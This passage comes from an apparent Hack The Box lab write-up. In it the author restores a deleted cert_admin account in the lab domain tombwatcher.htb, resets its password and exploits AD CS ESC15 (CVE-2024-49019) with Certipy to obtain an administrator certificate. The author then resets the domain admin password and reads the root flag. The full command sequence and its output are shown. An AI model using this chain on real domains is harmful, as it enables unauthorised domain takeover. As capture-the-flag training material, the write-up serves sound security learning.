CanonicalName                   : tombwatcher.htb/Deleted Objects/cert_admin
                                  DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
CN                              : cert_admin
                                  DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
codePage                        : 0
countryCode                     : 0
Created                         : 11/16/2024 12:07:04 PM
createTimeStamp                 : 11/16/2024 12:07:04 PM
Deleted                         : True
Description                     :
DisplayName                     :
DistinguishedName               : CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb
dSCorePropagationData           : {11/16/2024 12:07:10 PM, 11/16/2024 12:07:08 PM, 12/31/1600 7:00:00 PM}
givenName                       : cert_admin
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : OU=ADCS,DC=tombwatcher,DC=htb
lastLogoff                      : 0
lastLogon                       : 0
logonCount                      : 0
Modified                        : 11/16/2024 12:07:27 PM
modifyTimeStamp                 : 11/16/2024 12:07:27 PM
msDS-LastKnownRDN               : cert_admin
Name                            : cert_admin
                                  DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : user
ObjectGUID                      : 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
objectSid                       : S-1-5-21-1392491010-1358638721-2126982587-1111
primaryGroupID                  : 513
ProtectedFromAccidentalDeletion : False
pwdLastSet                      : 133762504248946345
sAMAccountName                  : cert_admin
sDRightsEffective               : 7
sn                              : cert_admin
userAccountControl              : 66048
uSNChanged                      : 13197
uSNCreated                      : 13186
whenChanged                     : 11/16/2024 12:07:27 PM
whenCreated                     : 11/16/2024 12:07:04 PM
```

Found out the deleted object is `cert_admin`. <br>
In order to use `cert_admin`, we need to restore, enable and set new password.

```powershell
*Evil-WinRM* PS C:\Users\john\Documents> Restore-ADObject -Identity "938182c3-bf0b-410a-9aaa-45c8e1a02ebf"
*Evil-WinRM* PS C:\Users\john\Documents> Enable-ADAccount -Identity cert_admin
*Evil-WinRM* PS C:\Users\john\Documents> Set-ADAccountPassword -Identity cert_admin -NewPassword (ConvertTo-SecureString "passw4rd@123" -AsPlainText -Force) -Reset
```

Double check that we has enable the account and set new password.

```powershell
*Evil-WinRM* PS C:\Users\john\Documents> Get-ADUser -Identity cert_admin


DistinguishedName : CN=cert_admin,OU=ADCS,DC=tombwatcher,DC=htb
Enabled           : True
GivenName         : cert_admin
Name              : cert_admin
ObjectClass       : user
ObjectGUID        : 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
SamAccountName    : cert_admin
SID               : S-1-5-21-1392491010-1358638721-2126982587-1111
Surname           : cert_admin
UserPrincipalName :
```

Now we can access to `cert_admin` account.

```powershell
└─$ evil-winrm -i tombwatcher.htb -u "cert_admin" -p 'passw4rd@123'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
                                        
Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError
                                        
Error: Exiting with code 1
```

Hmm, can not access. Let's continue enumerate the `ADCS` with `cert_admin` account.

```bash
└─$ certipy find -u cert_admin -p 'passw4rd@123' -target tombwatcher.htb -text -stdout -vulnerable
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The resolution lifetime expired after 5.403 seconds: Server Do53:172.16.147.2@53 answered The DNS operation timed out.; Server Do53:172.16.147.2@53 answered The DNS operation timed out.; Server Do53:172.16.147.2@53 answered The DNS operation timed out.
[!] Use -debug to print a stacktrace
[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 13 issuance policies
[*] Found 0 OIDs linked to templates
[!] DNS resolution failed: The resolution lifetime expired after 5.403 seconds: Server Do53:172.16.147.2@53 answered The DNS operation timed out.; Server Do53:172.16.147.2@53 answered The DNS operation timed out.; Server Do53:172.16.147.2@53 answered The DNS operation timed out.
[!] Use -debug to print a stacktrace
[*] Retrieving CA configuration for 'tombwatcher-CA-1' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'tombwatcher-CA-1'
[*] Checking web enrollment for CA 'tombwatcher-CA-1' @ 'DC01.tombwatcher.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : tombwatcher-CA-1
    DNS Name                            : DC01.tombwatcher.htb
    Certificate Subject                 : CN=tombwatcher-CA-1, DC=tombwatcher, DC=htb
    Certificate Serial Number           : 3428A7FC52C310B2460F8440AA8327AC
    Certificate Validity Start          : 2024-11-16 00:47:48+00:00
    Certificate Validity End            : 2123-11-16 00:57:48+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : TOMBWATCHER.HTB\Administrators
      Access Rights
        ManageCa                        : TOMBWATCHER.HTB\Administrators
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        ManageCertificates              : TOMBWATCHER.HTB\Administrators
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Enroll                          : TOMBWATCHER.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : WebServer
    Display Name                        : Web Server
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T17:07:26+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\cert_admin
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\cert_admin
    [+] User Enrollable Principals      : TOMBWATCHER.HTB\cert_admin
    [!] Vulnerabilities
      ESC15                             : Enrollee supplies subject and schema version is 1.
    [*] Remarks
      ESC15                             : Only applicable if the environment has not been patched. See CVE-2024-49019 or the wiki for more details.
```

So there is vulnerability on [ESC15](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu) which will inject arbitrary application policies and bypass Extended Key Usage (EKU) restrictions. <br>
&rarr; Let's use this concept to abuse and escalate to `administrator`.

## Privilege Escalation
### ESC15 - Arbitrary Application Policy Injection in V1 Templates (CVE-2024-49019)
```bash
└─$ certipy req -dc-ip 10.129.xx.xx -u 'cert_admin@tombwatcher.htb' -p 'passw4rd@123' -target-ip 10.129.xx.xx -ca 'tombwatcher-CA-1' -template 'WebServer' -upn 'administrator@tombwatcher.htb' -sid 'S-1-5-21-1392491010-1358638721-2126982587-500' -application-policies 'Client Authentication'
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 4
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@tombwatcher.htb'
[*] Certificate object SID is 'S-1-5-21-1392491010-1358638721-2126982587-500'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

This command will request a certificate, inject the `Client Authentication` policy and target the UPN `administrator@tombwatcher.htb`. <br>
You can get the `administrator` SID from this command.

```powershell
*Evil-WinRM* PS C:\Users\john\Documents> Get-ADUser -Identity Administrator | Select-Object SID

SID
---
S-1-5-21-1392491010-1358638721-2126982587-500
```

Now we can authenticate via LDAPS using the obtained certificate.

```powershell
└─$ certipy auth -pfx administrator.pfx -dc-ip 10.129.xx.xx -ldap-shell
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@tombwatcher.htb'
[*]     SAN URL SID: 'S-1-5-21-1392491010-1358638721-2126982587-500'
[*]     Security Extension SID: 'S-1-5-21-1392491010-1358638721-2126982587-500'
[*] Connecting to 'ldaps://10.129.xx.xx:636'
[*] Authenticated to '10.129.xx.xx' as: 'u:TOMBWATCHER\\Administrator'
Type help for list of commands

# 
```

To know how to use the command in ldap shell, you can use `help` command.

```powershell
# help

 add_computer computer [password] [nospns] - Adds a new computer to the domain with the specified password. If nospns is specified, computer will be created with only a single necessary HOST SPN. Requires LDAPS.
 rename_computer current_name new_name - Sets the SAMAccountName attribute on a computer object to a new value.
 add_user new_user [parent] - Creates a new user.
 add_user_to_group user group - Adds a user to a group.
 change_password user [password] - Attempt to change a given user's password. Requires LDAPS.
 clear_rbcd target - Clear the resource based constrained delegation configuration information.
 disable_account user - Disable the user's account.
 enable_account user - Enable the user's account.
 dump - Dumps the domain.
 search query [attributes,] - Search users and groups by name, distinguishedName and sAMAccountName.
 get_user_groups user - Retrieves all groups this user is a member of.
 get_group_users group - Retrieves all members of a group.
 get_laps_password computer - Retrieves the LAPS passwords associated with a given computer (sAMAccountName).
 grant_control target grantee - Grant full control of a given target object (sAMAccountName) to the grantee (sAMAccountName).
 set_dontreqpreauth user true/false - Set the don't require pre-authentication flag to true or false.
 set_rbcd target grantee - Grant the grantee (sAMAccountName) the ability to perform RBCD to the target (sAMAccountName).
 start_tls - Send a StartTLS command to upgrade from LDAP to LDAPS. Use this to bypass channel binding for operations necessitating an encrypted channel.
 write_gpo_dacl user gpoSID - Write a full control ACE to the gpo for the given user. The gpoSID must be entered surrounding by {}.
 whoami - get connected user
 dirsync - Dirsync requested attributes
 exit - Terminates this session.
```

Now let's change the password of `administrator` to `P@ssw4rd123`.

```powershell
# change_password administrator P@ssw4rd123
Got User DN: CN=Administrator,CN=Users,DC=tombwatcher,DC=htb
Attempting to set new password of: P@ssw4rd123
Password changed successfully!

# exit
Bye!
```

```powershell
└─$ evil-winrm -i tombwatcher.htb -u "administrator" -p "P@ssw4rd123"
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---         6/8/2025   3:37 AM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
da4053xxxxxxxxxxxxxxxxxxxxxxxxxx
```

Nailed the `root.txt` flag.

![result](/assets/img/tombwatcher-htb-season8/result.png)